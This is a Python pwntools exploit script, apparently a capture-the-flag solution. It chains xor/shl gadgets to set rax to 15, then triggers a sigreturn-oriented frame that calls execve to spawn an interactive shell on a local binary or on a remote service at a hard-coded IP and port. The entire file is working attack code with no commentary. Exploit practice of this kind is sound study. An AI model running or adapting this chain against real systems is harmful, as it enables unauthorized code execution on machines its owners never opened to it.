from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.170.55.8', 1337)
    else:
        return process(e.path, level='error')


p = start()
syscall = 0x40102d

'''((((((1*2)+1)*2)+1)*2)+1)'''
def set_rax_15():
    xrxr = 0x40103d
    xor1 = 0x401034
    shl1 = 0x401030

    chain = p64(xrxr)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    chain += p64(shl1)
    chain += p64(xor1)
    return chain


def srop_frame():
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = 0x40200b
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    return bytes(frame)


chain = set_rax_15()
chain += p64(syscall)
chain += srop_frame()
p.sendline(chain)
p.interactive()
